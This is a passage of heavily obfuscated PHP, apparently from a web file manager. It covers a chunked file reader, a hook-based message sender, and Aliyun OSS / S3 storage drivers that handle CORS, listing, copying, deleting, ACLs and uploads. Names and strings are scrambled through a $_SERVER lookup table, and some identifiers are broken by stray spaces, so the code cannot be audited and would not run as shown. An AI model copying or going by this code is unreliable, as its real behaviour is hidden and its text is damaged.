strlen($ÖéøÌÀû))); return self::$fileInfo[$¤«ê’­ä]; } public static function read($È°ë³İ, $„‡Ê÷§Œ, $¾ÕßŸÛü) { if (!isset(self::$_fopenCache[$È°ë³İ])) { $æãèş˜Ğ = new StreamWrapperIO(); $æãèş˜Ğ->stream_open($È°ë³İ); self::$_fopenCache[$È°ë³İ] = $æãèş˜Ğ; } $æãèş˜Ğ = self::$_fopenCache[$È°ë³İ]; return $æãèş˜Ğ->fileSubstr($„‡Ê÷§Œ, $¾ÕßŸÛü); } public static function _read($øºÇñ±, $õğ¯÷ûı, $èô¶àÇ) { $Ç‚Á™óî =& $_SERVER[¹òÍ›æş]; $íÅè”Ç” = fopen($øºÇñ±, $Ç‚Á™óî[1394]); if (!$íÅè”Ç”) { return $Ç‚Á™óî[12]; } $áÃ±ïä¯ = 8192; fseek($íÅè”Ç”, $õğ¯÷ûı, SEEK_SET); $¨âÉß = $Ç‚Á™óî[12]; $ìçÀ·ìÃ = 0; while ($ìçÀ·ìÃ < $èô¶àÇ) { $ŸËñ¡Îù = min($áÃ±ïä¯, $èô¶àÇ - $ìçÀ·ìÃ); $¨âÉß .= fread($íÅè”Ç”, $ŸËñ¡Îù); $ìçÀ·ìÃ += $ŸËñ¡Îù; } fclose($íÅè”Ç”); return $¨âÉß; } public function fileSubstr($ğÓÈÇï¿, $¾ûŒ×š) { $æ€ñÆó´ =& $_SERVER[¹òÍ›æş]; $ìá€¯úø = $this->info[$æ€ñÆó´[86]]; $îº’ËèŞ = $ğÓÈÇï¿; $Õûì…”ë = $¾ûŒ×š; if ($ğÓÈÇï¿ < 0) { $ğÓÈÇï¿ = $ìá€¯úø + $ğÓÈÇï¿; } if ($¾ûŒ×š === !1) { $¾ûŒ×š = $ìá€¯úø - $ğÓÈÇï¿; } if ($ğÓÈÇï¿ + $¾ûŒ×š > $ìá€¯úø) { $¾ûŒ×š = $ìá€¯úø - $ğÓÈÇï¿; } if ($¾ûŒ×š <= 0) { return $æ€ñÆó´[12]; } if ($ğÓÈÇï¿ < 0 || $ğÓÈÇï¿ >= $ìá€¯úø || $¾ûŒ×š <= 0 || $¾ûŒ×š > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\154\145\x52\145\x61\144\40\x65\x72\162\x6f\162\41\40\163\x74\x61\162\x74\75{$ğÓÈÇï¿}\x3b\x6c\145\156\147\x74\x68\x3d{$¾ûŒ×š}\73\x20\163\151\x7a\145\75{$ìá€¯úø}\x3b"); } $ˆ‚·§Š = 64 * 1024; $ö¸€Ã¢ì =& self::$_chunkBuffer[$this->path]; if (!$ö¸€Ã¢ì) { $ö¸€Ã¢ì = array(); } $Ğ“Ñ’İ‰ = 0; $×ãÎ™Ì• = 0; $ØÌË°á = $æ€ñÆó´[12]; foreach ($ö¸€Ã¢ì as $Ğ“Ñ’İ‰ => $ØÌË°á) { $Ğ“Ñ’İ‰ = intval($Ğ“Ñ’İ‰); $×ãÎ™Ì• = $Ğ“Ñ’İ‰ + strlen($ØÌË°á); if ($ğÓÈÇï¿ >= $×ãÎ™Ì•) { continue; } if ($ğÓÈÇï¿ >= $Ğ“Ñ’İ‰ && $ğÓÈÇï¿ + $¾ûŒ×š <= $×ãÎ™Ì•) { return substr($ØÌË°á, $ğÓÈÇï¿ - $Ğ“Ñ’İ‰, $¾ûŒ×š); } break; } if (count($ö¸€Ã¢ì) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($æ€ñÆó´[1526], $æ€ñÆó´[1527] . count($ö¸€Ã¢ì) . "\73\163\164\x61\162\164\75{$ğÓÈÇï¿}\x2c\x6c\x65\156\147\164\150\x3d{$¾ûŒ×š}\x3b\x70\157\163\145\x3a{$Ğ“Ñ’İ‰}\176{$×ãÎ™Ì•}"); throw new Exception($æ€ñÆó´[1528]); } $Ë–ğòúó = intval($ğÓÈÇï¿ / $ˆ‚·§Š) * $ˆ‚·§Š; $ª‚Æ«£ = ceil(($ğÓÈÇï¿ + $¾ûŒ×š) / $ˆ‚·§Š) * $ˆ‚·§Š - $Ë–ğòúó; $Õõƒ = IO::fileSubstr($this->path, $Ë–ğòúó, $ª‚Æ«£); $ö¸€Ã¢ì[$Ë–ğòúó . $æ€ñÆó´[12]] = $Õõƒ; ksort($ö¸€Ã¢ì); $ò’ñ›¯ = substr($Õõƒ, $ğÓÈÇï¿ - $Ë–ğòúó, $¾ûŒ×š); return $ò’ñ›¯; } private function log($ÑÊÎå, $ñÉÀß¿) { $†ÆÓ¿ ì =& $_SERVER[¹òÍ›æş]; $ß·ÜÅÆÁ = timeFloat() - $this->timeStart; write_log(sprintf($†ÆÓ¿ ì[1529], $ÑÊÎå, $this->info[$†ÆÓ¿ ì[32]], $ß·ÜÅÆÁ, $ñÉÀß¿), $†ÆÓ¿ ì[1209]); } } class Message { function __construct() { } public function send($å±ææœ = '', $é´ôìÒ´ = array(), $ì±»°Â = "\164\145\x78\164") { $è¸†›³Ù =& $_SERVER[¹òÍ›æş]; $Šäø²¿° = array($è¸†›³Ù[33] => $è¸†›³Ù[1530], $è¸†›³Ù[784] => $å±ææœ); if (in_array($ì±»°Â, array($è¸†›³Ù[1530], $è¸†›³Ù[1531]))) { $Šäø²¿°[$è¸†›³Ù[33]] = $ì±»°Â; } $é´ôìÒ´ = array($è¸†›³Ù[543] => isset($é´ôìÒ´[$è¸†›³Ù[543]]) ? $é´ôìÒ´[$è¸†›³Ù[543]] : $è¸†›³Ù[12], $è¸†›³Ù[628] => isset($é´ôìÒ´[$è¸†›³Ù[628]]) ? $é´ôìÒ´[$è¸†›³Ù[628]] : $è¸†›³Ù[12]); if (empty($å±ææœ) || empty($é´ôìÒ´[$è¸†›³Ù[543]]) && empty($é´ôìÒ´[$è¸†›³Ù[628]])) { return !1; } $İ°®«ş = array($è¸†›³Ù[1471] => $Šäø²¿°, $è¸†›³Ù[1532] => $é´ôìÒ´); Hook::trigger($è¸†›³Ù[1533], $İ°®«ş); } } goto BÊæğäğ÷Ã; FÊ¸Ç´ÌóÁ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($™³ŞĞÓğ) { parent::__construct($™³ŞĞÓğ); $this->signatureVersion($_SERVER[¹òÍ›æş][226]); } public function fileOutLink($Š£ÛÄ‘) { $ßöÚÔ• =& $_SERVER[¹òÍ›æş]; if (substr($Š£ÛÄ‘, 0, 7) == $ßöÚÔ•[1358]) { $Š£ÛÄ‘ = $ßöÚÔ•[1359] . substr($Š£ÛÄ‘, 7); } header($ßöÚÔ•[171] . $Š£ÛÄ‘); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($åÒ§ˆ •) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹òÍ›æş][1395]; $this->_init($åÒ§ˆ •); } public function _init($ü˜Òßí) { $„îçªÍ§ =& $_SERVER[¹òÍ›æş]; $this->config = $ü˜Òßí; foreach ($ü˜Òßí as $¨şààè => $»ß°ıÙâ) { if (isset($this->{$¨şààè})) { $this->{$¨şààè} = $»ß°ıÙâ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($„îçªÍ§[1396] . LNG($„îçªÍ§[1397])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Í›ÙÊ =& $_SERVER[¹òÍ›æş]; $ä÷¶ñ¾ = new OSS\Model\CorsConfig(); $‘ëˆæ‚  = new OSS\Model\CorsRule(); $‘ëˆæ‚ ->addAllowedOrigin($Í›ÙÊ[1398]); $‘ëˆæ‚ ->addAllowedMethod($Í›ÙÊ[1399]); $‘ëˆæ‚ ->addAllowedMethod($Í›ÙÊ[1400]); $‘ëˆæ‚ ->addAllowedMethod($Í›ÙÊ[1401]); $‘ëˆæ‚ ->addAllowedMethod($Í›ÙÊ[1402]); $‘ëˆæ‚ ->addAllowedMethod($Í›ÙÊ[170]); $‘ëˆæ‚ ->setMaxAgeSeconds(600); $‘ëˆæ‚ ->addExposeHeader($Í›ÙÊ[1403]); $‘ëˆæ‚ ->addAllowedHeader($Í›ÙÊ[1398]); $ä÷¶ñ¾->addRule($‘ëˆæ‚ ); try { $this->client->putBucketCors($this->bucket, $ä÷¶ñ¾); } catch (OSS\Core\OssException $ûóé¦¿ ) { return !1; } return !0; } public function getBucketCors() { $ª‡±ôÍŞ =& $_SERVER[¹òÍ›æş]; $–×êèú¿ = null; try { $–×êèú¿ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ê³ûÈ©) { return null; } if (!$–×êèú¿ || !($²Ÿ®¼™ = $–×êèú¿->getRules())) { return null; } $§àÖòÄ = $²Ÿ®¼™[0]->getAllowedOrigins(); $Ø™¯µº• = $²Ÿ®¼™[0]->getAllowedMethods(); $¸³æ’áş = $²Ÿ®¼™[0]->getMaxAgeSeconds(); $«üû•®² = $²Ÿ®¼™[0]->getExposeHeaders(); $ä‘‡êÛî = $²Ÿ®¼™[0]->getAllowedHeaders(); return array($ª‡±ôÍŞ[198] => isset($§àÖòÄ[0]) ? $§àÖòÄ[0] : $ª‡±ôÍŞ[12], $ª‡±ôÍŞ[202] => $Ø™¯µº•, $ª‡±ôÍŞ[1404] => $¸³æ’áş, $ª‡±ôÍŞ[1405] => isset($«üû•®²[0]) ? $«üû•®²[0] : $ª‡±ôÍŞ[12], $ª‡±ôÍŞ[200] => isset($ä‘‡êÛî[0]) ? $ä‘‡êÛî[0] : $ª‡±ôÍŞ[12]); } public function isBucketCors() { $ú®¹Û®§ =& $_SERVER[¹òÍ›æş]; $í€æÄ­Ä = $this->getBucketCors(); if (!$í€æÄ­Ä || !is_array($í€æÄ­Ä)) { return !1; } if ($í€æÄ­Ä[$ú®¹Û®§[198]] != $ú®¹Û®§[199] || $í€æÄ­Ä[$ú®¹Û®§[200]] != $ú®¹Û®§[199]) { return !1; } $ÏªÃ¾î½ = array_map($ú®¹Û®§[201], $í€æÄ­Ä[$ú®¹Û®§[202]]); if (!is_array($ÏªÃ¾î½)) { $ÏªÃ¾î½ = array(); } $¿ÖáîËØ = array($ú®¹Û®§[203], $ú®¹Û®§[204], $ú®¹Û®§[205], $ú®¹Û®§[206], $ú®¹Û®§[207]); $ã’İ‡¿ñ = array_diff($¿ÖáîËØ, $ÏªÃ¾î½); return empty($ã’İ‡¿ñ); } public function mkfile($–¯µñºŸ, $‘‡š°Ÿ“ = '', $ÎºÔ®µ® = REPEAT_RENAME) { $Å× ’ö¢ = $this->setContent($–¯µñºŸ, $‘‡š°Ÿ“); if ($Å× ’ö¢ !== !1) { return $this->getPathOuter($–¯µñºŸ); } return !1; } public function mkdir($‡ÆÖ“², $Èğèˆé¤ = REPEAT_SKIP) { if ($Èğèˆé¤ && $this->_isFolder($‡ÆÖ“²)) { return $this->getPathOuter($‡ÆÖ“²); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($‡ÆÖ“²)); } catch (OSS\Core\OssException $Ì¼ÓçéÃ) { return !1; } return $this->getPathOuter($‡ÆÖ“²); } private function fileList($İåºÄŸ, $íÃ‘Ú„© = '', $ò§©Ì£ = 0) { $şáÇáÔô =& $_SERVER[¹òÍ›æş]; $İåºÄŸ = trim($İåºÄŸ, $şáÇáÔô[8]); $‚½±Ï§ = empty($İåºÄŸ) && $İåºÄŸ !== $şáÇáÔô[208] ? $şáÇáÔô[12] : $İåºÄŸ . $şáÇáÔô[8]; $ßëÈ¨óÊ = $şáÇáÔô[12]; $ ‹”Û©Ï = 1000; $Í¸Æ¸á = $íÀ®½´“ = array(); while (!0) { check_abort(); $Şí Ûıı = array($şáÇáÔô[1406] => $íÃ‘Ú„©, $şáÇáÔô[1407] => $‚½±Ï§, $şáÇáÔô[1408] => $ ‹”Û©Ï, $şáÇáÔô[1409] => $ßëÈ¨óÊ); try { $³Êèäœ“ = $this->client->listObjects($this->bucket, $Şí Ûıı); } catch (OSS\Core\OssException $‘íû—€ï) { break; } $ßëÈ¨óÊ = $³Êèäœ“->getNextMarker(); $éÁ¹Ñ®¨ = $³Êèäœ“->getObjectList(); $ü¥ÀŞõÛ = $³Êèäœ“->getPrefixList(); foreach ($éÁ¹Ñ®¨ as $ìïó›Ş) { if ($ìïó›Ş->getKey() == $‚½±Ï§) { continue; } $ó±»€ü¸ = $ìïó›Ş->getKey(); $’ú·¯‰“ = $ìïó›Ş->getSize(); $×ÏÃæ—ß = $ìïó›Ş->getLastModified(); $ÅöÈ ÉŸ = $ò§©Ì£ ? array($şáÇáÔô[32] => $ó±»€ü¸, $şáÇáÔô[86] => $’ú·¯‰“, $şáÇáÔô[190] => strtotime($×ÏÃæ—ß)) : $ó±»€ü¸; $ ‡“©¹… = $’ú·¯‰“ == 0 && substr($ó±»€ü¸, strlen($ó±»€ü¸) - 1, 1) == $şáÇáÔô[8] ? !0 : !1; $áãëŸ¢Ñ = array($şáÇáÔô[86] => $’ú·¯‰“, $şáÇáÔô[1410] => $’ú·¯‰“, $şáÇáÔô[95] => strtotime($×ÏÃæ—ß), $şáÇáÔô[1411] => $×ÏÃæ—ß); $this->cacheMethodInfoSet($ó±»€ü¸, $ ‡“©¹…, $áãëŸ¢Ñ); if ($ ‡“©¹…) { $Í¸Æ¸á[] = $ó±»€ü¸; continue; } $íÀ®½´“[] = $ÅöÈ ÉŸ; } foreach ($ü¥ÀŞõÛ as $ÁØŞ‘±ü) { $Í¸Æ¸á[] = $ÁØŞ‘±ü->getPrefix(); $this->cacheMethodInfoSet($ÁØŞ‘±ü->getPrefix(), !0); } if ($ßëÈ¨óÊ === $şáÇáÔô[12]) { break; } } $this->cacheMethodInfoSet($İåºÄŸ, !0); return array($şáÇáÔô[92] => $Í¸Æ¸á, $şáÇáÔô[93] => $íÀ®½´“); } public function copyFile($µ«¤ã³¥, $ùá•„€) { $ õà÷ÛÍ = $this->size($µ«¤ã³¥); if ($ õà÷ÛÍ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $µ«¤ã³¥, $this->bucket, $this->pathEncode($ùá•„€)); } catch (OSS\Core\OssException $»ÎèôÇÀ) { return !1; } return $this->getPathOuter($ùá•„€); } $òªò“ßø = $this->multiCopyObject($µ«¤ã³¥, $ùá•„€, $ õà÷ÛÍ); return $òªò“ßø ? $this->getPathOuter($ùá•„€) : !1; } private function multiCopyObject($‚ÌŞ—âë, $˜ĞÌûÖš, $½Ùœãº›) { $´Ö•Éô„ =& $_SERVER[¹òÍ›æş]; try { $ˆ”•ù“Û = array(); if ($ûõ«››Œ = $this->hashMd5($‚ÌŞ—âë)) { $ˆ”•ù“Û = array(OSS\OssClient::OSS_HEADERS => array($´Ö•Éô„[1412] => $ûõ«››Œ)); } $¹ÆŠ€ÏÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($˜ĞÌûÖš), $ˆ”•ù“Û); $€åÙòÌ… = 1; $àÄ²®ÙÍ = 0; $‚ŒŸÜÜ = array(); $ó£Æ¨ = 1024 * 1024 * 10; $ŠœÑâ± = $this->client->generateMultiuploadParts($½Ùœãº›, $ó£Æ¨); foreach ($ŠœÑâ± as $¿ûŸß— => $ÊêÆîÑÌ) { $†Ù¯¿ğİ = $àÄ²®ÙÍ + (int) $ÊêÆîÑÌ[$´Ö•Éô„[1413]]; $Ş›™ÅÛÌ = (int) $ÊêÆîÑÌ[$´Ö•Éô„[375]] + $†Ù¯¿ğİ - 1; $òöÈÃ¦œ = array($´Ö•Éô„[1414] => $†Ù¯¿ğİ, $´Ö•Éô„[1415] => $Ş›™ÅÛÌ); $‚ŒŸÜÜ[] = $this->client->uploadPartCopy($this->bucket, $‚ÌŞ—âë, $this->bucket, $this->pathEncode($˜ĞÌûÖš), $€åÙòÌ…, $¹ÆŠ€ÏÆ, $òöÈÃ¦œ); $€åÙòÌ… = $€åÙòÌ… + 1; } $Îå²çİƒ = array(); foreach ($‚ŒŸÜÜ as $¿ûŸß— => $‡ùÃŸ¬±) { $Îå²çİƒ[] = array($´Ö•Éô„[1416] => $¿ûŸß— + 1, $´Ö•Éô„[1417] => $‡ùÃŸ¬±); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($˜ĞÌûÖš), $¹ÆŠ€ÏÆ, $Îå²çİƒ); } catch (OSS\Core\OssException $’ÅùÙùŠ) { return !1; } return !0; } public function moveFile($—¯Ê²–Ï, $Ò¡şÑìÙ) { if ($this->copyFile($—¯Ê²–Ï, $Ò¡şÑìÙ)) { $this->remove($—¯Ê²–Ï); return $this->getPathOuter($Ò¡şÑìÙ); } return !1; } public function delFile($£¾Ü–•·) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($£¾Ü–•·)); } catch (OSS\Core\OssException $‡´ûàÆ) { return !1; } return !0; } public function delFolder($¸ëÌÊ„) { $‰ÙŞ¾ùƒ =& $_SERVER[¹òÍ›æş]; if (!$this->exist($¸ëÌÊ„)) { return !0; } $this->listItemCache = !1; $‰½­Ü¹õ = $this->fileList($¸ëÌÊ„); $this->listItemCache = !0; $›Ã§¢é… = trim($¸ëÌÊ„, $‰ÙŞ¾ùƒ[8]) . $‰ÙŞ¾ùƒ[8]; if (!empty($¸ëÌÊ„) && $¸ëÌÊ„ !== $‰ÙŞ¾ùƒ[208] && !in_array($›Ã§¢é…, $‰½­Ü¹õ[$‰ÙŞ¾ùƒ[92]])) { $‰½­Ü¹õ[$‰ÙŞ¾ùƒ[92]][] = $›Ã§¢é…; } $®”Ôš¸ª = $this->delByBatch($‰½­Ü¹õ[$‰ÙŞ¾ùƒ[93]]); if (!$®”Ôš¸ª) { return !1; } $®”Ôš¸ª = $this->delByBatch($‰½­Ü¹õ[$‰ÙŞ¾ùƒ[92]]); if (!$®”Ôš¸ª) { return !1; } return $this->delFile($›Ã§¢é…); } private function delByBatch($—†èâì”) { foreach (array_chunk($—†èâì”, 1000) as $ù‡ˆ©´) { try { $this->client->deleteObjects($this->bucket, $ù‡ˆ©´); } catch (OSS\Core\OssException $¾™×êÄà) { return !1; } } return !0; } public function rename($ÑÖû…Åä, $ëçò¡Çù) { return $this->renameObject($ÑÖû…Åä, $ëçò¡Çù); } private function fileInfo($Ã¾©…‡Æ, $Á­ÜâÍ˜ = false, $³ÏËÈ½¤ = array()) { $•ß‚€Ñ£ =& $_SERVER[¹òÍ›æş]; $¬“Ëô = array($•ß‚€Ñ£[32] => $this->pathThis($Ã¾©…‡Æ), $•ß‚€Ñ£[94] => $this->getPathOuter($Ã¾©…‡Æ), $•ß‚€Ñ£[33] => $•ß‚€Ñ£[210], $•ß‚€Ñ£[86] => isset($³ÏËÈ½¤[$•ß‚€Ñ£[86]]) ? $³ÏËÈ½¤[$•ß‚€Ñ£[86]] : 0, $•ß‚€Ñ£[184] => $this->ext($Ã¾©…‡Æ)); if ($Á­ÜâÍ˜) { return $¬“Ëô; } $¬“Ëô[$•ß‚€Ñ£[211]] = $¬“Ëô[$•ß‚€Ñ£[95]] = 0; $¬“Ëô[$•ß‚€Ñ£[212]] = $¬“Ëô[$•ß‚€Ñ£[213]] = !0; if (empty($³ÏËÈ½¤)) { $£‘ªû•µ = $this->objectMeta($Ã¾©…‡Æ); if (!$£‘ªû•µ) { return $¬“Ëô; } $³ÏËÈ½¤ = array($•ß‚€Ñ£[95] => strtotime($£‘ªû•µ[$•ß‚€Ñ£[1411]]), $•ß‚€Ñ£[86] => $£‘ªû•µ[$•ß‚€Ñ£[1410]] + 0); } if (isset($³ÏËÈ½¤[$•ß‚€Ñ£[86]])) { $¬“Ëô[$•ß‚€Ñ£[86]] = $³ÏËÈ½¤[$•ß‚€Ñ£[86]]; } if (isset($³ÏËÈ½¤[$•ß‚€Ñ£[95]])) { $¬“Ëô[$•ß‚€Ñ£[95]] = $³ÏËÈ½¤[$•ß‚€Ñ£[95]]; } if (isset($³ÏËÈ½¤[$•ß‚€Ñ£[190]]) && !trim($¬“Ëô[$•ß‚€Ñ£[95]])) { $¬“Ëô[$•ß‚€Ñ£[95]] = $³ÏËÈ½¤[$•ß‚€Ñ£[190]]; } return $¬“Ëô; } private function folderInfo($½îÊ²ÆÄ, $³ÖùÎøé = false, $±ıêı× = array()) { $²ù“®Îƒ =& $_SERVER[¹òÍ›æş]; $¶Û×èÆÚ = array($²ù“®Îƒ[32] => $this->pathThis($½îÊ²ÆÄ), $²ù“®Îƒ[94] => $this->getPathOuter($²ù“®Îƒ[8] . $½îÊ²ÆÄ), $²ù“®Îƒ[33] => $²ù“®Îƒ[85]); if ($³ÖùÎøé) { return $¶Û×èÆÚ; } $¶Û×èÆÚ[$²ù“®Îƒ[211]] = $¶Û×èÆÚ[$²ù“®Îƒ[95]] = 0; $¶Û×èÆÚ[$²ù“®Îƒ[212]] = $¶Û×èÆÚ[$²ù“®Îƒ[213]] = !0; if (empty($±ıêı×)) { $½îÊ²ÆÄ = rtrim($½îÊ²ÆÄ, $²ù“®Îƒ[8]) . $²ù“®Îƒ[8]; $ú–²·é = $this->objectMeta($½îÊ²ÆÄ); if (!$ú–²·é) { return $¶Û×èÆÚ; } $±ıêı× = array($²ù“®Îƒ[211] => $ú–²·é[$²ù“®Îƒ[540]][$²ù“®Îƒ[1418]], $²ù“®Îƒ[95] => strtotime($ú–²·é[$²ù“®Îƒ[1411]])); } if (isset($±ıêı×[$²ù“®Îƒ[95]])) { $¶Û×èÆÚ[$²ù“®Îƒ[95]] = $±ıêı×[$²ù“®Îƒ[95]]; } if (isset($±ıêı×[$²ù“®Îƒ[211]])) { $¶Û×èÆÚ[$²ù“®Îƒ[211]] = $±ıêı×[$²ù“®Îƒ[211]]; } return $¶Û×èÆÚ; } public function listPath($üÏÎñÈÎ, $Î¡×ñÓ = false) { $Ã±ÊÕòâ =& $_SERVER[¹òÍ›æş]; $³—å˜“ = $this->fileList($üÏÎñÈÎ, $Ã±ÊÕòâ[8], !0); foreach ($³—å˜“[$Ã±ÊÕòâ[92]] as $æÕ“¥¾² => $í¿×éÂ€) { $³—å˜“[$Ã±ÊÕòâ[92]][$æÕ“¥¾²] = $this->folderInfo($í¿×éÂ€, $Î¡×ñÓ, $í¿×éÂ€); } foreach ($³—å˜“[$Ã±ÊÕòâ[93]] as $æÕ“¥¾² => $í¿×éÂ€) { $³—å˜“[$Ã±ÊÕòâ[93]][$æÕ“¥¾²] = $this->fileInfo($í¿×éÂ€[$Ã±ÊÕòâ[32]], $Î¡×ñÓ, $í¿×éÂ€); } return $³—å˜“; } protected function infoChildren($ªÀíáê”, &$Ğ¶¥¶ û) { $—»µ¤§¢ =& $_SERVER[¹òÍ›æş]; $ì÷öüµ = $this->fileList($ªÀíáê”, $—»µ¤§¢[12], !0); $Ğ¶¥¶ û[$—»µ¤§¢[88]] += count($ì÷öüµ[$—»µ¤§¢[92]]); $Ğ¶¥¶ û[$—»µ¤§¢[87]] += count($ì÷öüµ[$—»µ¤§¢[93]]); foreach ($ì÷öüµ[$—»µ¤§¢[93]] as $»ç·½×€) { if (!$»ç·½×€ || !$»ç·½×€[$—»µ¤§¢[86]]) { continue; } $Ğ¶¥¶ û[$—»µ¤§¢[86]] += $»ç·½×€[$—»µ¤§¢[86]]; } } public function has($ëŒ¿åĞ•, $­“œïË– = false, $è×ö½ÏÎ = true) { $‘¤Ó‹¯§ =& $_SERVER[¹òÍ›æş]; $ëŒ¿åĞ• = trim($ëŒ¿åĞ•, $‘¤Ó‹¯§[8]); $º­ÊÕ×” = empty($ëŒ¿åĞ•) && $ëŒ¿åĞ• !== $‘¤Ó‹¯§[208] ? $‘¤Ó‹¯§[12] : $ëŒ¿åĞ• . $‘¤Ó‹¯§[8]; $ÂÙ÷®Ûş = $‘¤Ó‹¯§[12]; $‡‘ôàãô = 500; $çê÷•´ = $†„íúÀ = 0; while (!0) { check_abort(); $’½ÀƒË = array($‘¤Ó‹¯§[1406] => $‘¤Ó‹¯§[8], $‘¤Ó‹¯§[1407] => $º­ÊÕ×”, $‘¤Ó‹¯§[1408] => $‡‘ôàãô, $‘¤Ó‹¯§[1409] => $ÂÙ÷®Ûş); try { $ı ÏßŞ = $this->client->listObjects($this->bucket, $’½ÀƒË); } catch (OSS\Core\OssException $ÛËÁÍê”) { break; } $ÂÙ÷®Ûş = $ı ÏßŞ->getNextMarker(); $Öúç­Öö = $ı ÏßŞ->getObjectList(); $ÆÜ‚Ÿ‹ = $ı ÏßŞ->getPrefixList(); if ($­“œïË–) { if (count($Öúç­Öö) > 1 || count($Öúç­Öö) == 1 && $Öúç­Öö[0]->getKey() != $º­ÊÕ×”) { $çê÷•´ += count($Öúç­Öö) - 1; } if (!empty($ÆÜ‚Ÿ‹)) { $†„íúÀ += count($ÆÜ‚Ÿ‹); } if ($ÂÙ÷®Ûş === $‘¤Ó‹¯§[12]) { break; } continue; } if ($è×ö½ÏÎ) { if (!empty($Öúç­Öö)) { if (count($Öúç­Öö) > 1 || $Öúç­Öö[0]->getKey() != $º­ÊÕ×”) { return !0; } } } else { if (!empty($ÆÜ‚Ÿ‹)) { return !0; } } if ($ÂÙ÷®Ûş === $‘¤Ó‹¯§[12]) { break; } } if ($­“œïË–) { return array($‘¤Ó‹¯§[217] => $çê÷•´, $‘¤Ó‹¯§[218] => $†„íúÀ); } return !1; } public function listAll($ÛışÖé®) { $ë˜Ö¥°’ =& $_SERVER[¹òÍ›æş]; $¨ÌÃ“ = $this->fileList($ÛışÖé®, $ë˜Ö¥°’[12], !0); $Äö¬×¶Ş = array_to_keyvalue($¨ÌÃ“[$ë˜Ö¥°’[93]], $ë˜Ö¥°’[32]); foreach ($¨ÌÃ“[$ë˜Ö¥°’[92]] as $²ÁÔÌÁÜ) { if (is_string($²ÁÔÌÁÜ)) { $Äö¬×¶Ş[$²ÁÔÌÁÜ] = array($ë˜Ö¥°’[86] => 0); } } return $this->listAllFiles($ÛışÖé®, $Äö¬×¶Ş); } public function canRead($Àıı¯¶×) { $—şâ³Ìù =& $_SERVER[¹òÍ›æş]; $¤½ÙˆÇ‰ = $this->pathAcl($Àıı¯¶×); return $¤½ÙˆÇ‰ == $—şâ³Ìù[1419] || $¤½ÙˆÇ‰ == $—şâ³Ìù[585] ? !0 : !1; } public function canWrite($¡”¥Èåœ) { $±Ã«ËÁø = $this->pathAcl($¡”¥Èåœ); return $±Ã«ËÁø == $_SERVER[¹òÍ›æş][585] ? !0 : !1; } public function pathAcl($œÜ›ğô) { $ó€èÄº• =& $_SERVER[¹òÍ›æş]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $’ñŒ€­» = $this->client->getObjectAcl($this->bucket, $this->pathEncode($œÜ›ğô)); } catch (OSS\Core\OssException $Ë¥Òé²) { return !1; } $Ÿ’Á’ö™ = $’ñŒ€­» == $ó€èÄº•[37] ? $this->bucketAcl : $’ñŒ€­»; if ($Ÿ’Á’ö™ == $ó€èÄº•[1420]) { return $ó€èÄº•[1419]; } if ($Ÿ’Á’ö™ == $ó€èÄº•[1421]) { return $ó€èÄº•[585]; } return $Ÿ’Á’ö™; } private function chmodPath($ÈÊÆÇÕ£, $¯şÁ½³ä = '') { $Öñ­ ‡õ =& $_SERVER[¹òÍ›æş]; $ÄÎ§±œ = empty($¯şÁ½³ä) ? $Öñ­ ‡õ[1421] : $¯şÁ½³ä; $×ø×†¨è = array($Öñ­ ‡õ[37], $Öñ­ ‡õ[209], $Öñ­ ‡õ[1420], $Öñ­ ‡õ[1421]); if (!in_array($ÄÎ§±œ, $×ø×†¨è)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÈÊÆÇÕ£), $ÄÎ§±œ); } catch (OSS\Core\OssException $ÃêÛ“Ôİ) { return !1; } return !0; } public function getContent($¶éÆµÖê) { return $this->fileSubstr($¶éÆµÖê, -1); } public function setContent($‰ æ¾’é, $çûğÊ‘Ê = '') { $ğçŞÆ¼š =& $_SERVER[¹òÍ›æş]; try { $àƒ•òÔí = $this->trafficLimit($ğçŞÆ¼š[1422]); $¢”æ‹ò¹ = $this->client->putObject($this->bucket, $this->pathEncode($‰ æ¾’é), $çûğÊ‘Ê, $àƒ•òÔí); } catch (OSS\Core\OssException $¦ë‚¦à) { return !1; } $§Óâè­ = array($ğçŞÆ¼š[1412] => trim($¢”æ‹ò¹[$ğçŞÆ¼š[1423]], $ğçŞÆ¼š[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‰ æ¾’é))); $this->updateObjMeta($‰ æ¾’é, $§Óâè­); return isset($¢”æ‹ò¹[$ğçŞÆ¼š[1424]][$ğçŞÆ¼š[269]]) ? !0 : !1; } private function updateObjMeta($¨İ±¶Ÿ, $€¼Ù«ßö) { $¨İ±¶Ÿ = $this->pathEncode($¨İ±¶Ÿ); try { $²ø½Ü™ = array(OSS\OssClient::OSS_HEADERS => $€¼Ù«ßö); $this->client->copyObject($this->bucket, $¨İ±¶Ÿ, $this->bucket, $¨İ±¶Ÿ, $²ø½Ü™); } catch (OSS\Core\OssException $è¾Å©£ğ) { return !1; } return !0; } public function upload($âÁÍŸÀ¿, $Åğ«üÈÀ, $êš»÷Äœ = false, $–ıÒó±— = REPEAT_REPLACE) { $²õÛ£» =& $_SERVER[¹òÍ›æş]; $›Œ×ÃˆÁ = trim($âÁÍŸÀ¿, $²õÛ£»[8]); $º–â†›® = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($²õÛ£»[1412] => @md5_file($Åğ«üÈÀ)), OSS\OssClient::OSS_CONTENT_TYPE => 